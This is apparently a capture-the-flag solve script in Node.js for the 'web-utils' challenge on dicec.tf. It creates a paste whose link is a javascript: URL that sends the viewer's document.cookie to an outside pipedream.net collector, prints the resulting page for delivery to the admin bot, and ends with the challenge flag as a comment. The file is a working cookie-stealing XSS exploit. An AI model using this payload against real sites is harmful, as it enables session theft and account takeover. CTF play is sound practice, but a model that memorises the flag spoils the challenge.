const axios = require('axios').default;


async function solve() {
  const res = await axios.post('https://web-utils.dicec.tf/api/createPaste',
    {
      type: 'link',
      data: 'javascript:location.href="https://enjbseo9pqy3ad8.m.pipedream.net?"+document.cookie'},
    {
      headers: {
        'Content-Type': 'application/json',
      }
    });
  const uid = res.data.data;
  const xss_url = `https://web-utils.dicec.tf/view/${uid}`;
  console.log("Send this url to admin");
  console.log(xss_url);
}

solve();

// dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}
